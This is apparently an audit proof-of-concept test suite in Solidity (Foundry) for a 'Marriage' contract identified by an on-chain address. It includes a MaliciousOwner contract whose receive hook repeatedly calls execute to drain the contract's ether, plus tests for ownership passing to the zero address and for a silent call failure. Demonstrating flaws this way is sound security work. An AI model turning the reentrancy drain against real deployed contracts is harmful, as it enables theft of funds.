// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x958a8f594101d2c0485a52319f29b2647f2ebc06.sol";

contract MaliciousOwner {
    Marriage public target;
    uint256 public reentrancyCount;

    constructor(address _target) {
        target = Marriage(_target);
    }

    function acceptOwnership() public {
        target.acceptOwnership();
    }

    function attack() public payable {
        // Initiate attack by calling execute on self
        target.execute(address(this), 1 ether, "");
    }

    receive() external payable {
        reentrancyCount++;
        if (address(target).balance > 0) {
            // Recursive reentrancy call
            target.execute(address(this), address(target).balance, "");
        }
    }
}

contract MarriageTest is Test {
    Marriage marriage;
    address owner = address(0x1);

    function setUp() public {
        vm.prank(owner);
        marriage = new Marriage(owner);
    }

    function testChangeOwnerToZeroAddress() public {
        // Change newOwner to address(0) - vulnerable
        vm.prank(owner);
        marriage.changeOwner(address(0));

        // As address(0), accept ownership - should succeed
        vm.prank(address(0));
        marriage.acceptOwnership();

        // Verify ownership changed to address(0)
        assertEq(marriage.owner(), address(0), "New owner is address(0)");
    }

    function testReentrancyAttack() public {
        // Fund marriage contract
        vm.deal(address(marriage), 10 ether);

        // Deploy malicious contract
        MaliciousOwner attacker = new MaliciousOwner(address(marriage));

        // Change ownership to attacker
        vm.prank(owner);
        marriage.changeOwner(address(attacker));

        // Attacker accepts ownership
        vm.prank(address(attacker));
        attacker.acceptOwnership();

        // Verify attacker is new owner
        assertEq(marriage.owner(), address(attacker), "Attacker is not owner");

        // Start reentrancy attack
        vm.prank(address(attacker));
        attacker.attack();

        // Verify funds drained
        uint256 marriageBalance = address(marriage).balance;
        assertEq(marriageBalance, 0, "Marriage contract not drained");

        // Verify multiple reentrancy occurred
        assertGt(attacker.reentrancyCount(), 1, "Failed reentrancy");
    }

    function testExecuteSilentFailure() public {
        // Fund marriage contract
        vm.deal(address(marriage), 1 ether);

        vm.prank(owner);
        // Call should succeed despite failure
        marriage.execute(0x000000000000000000000000000000000000dEaD, 1 ether, "");
    }
}
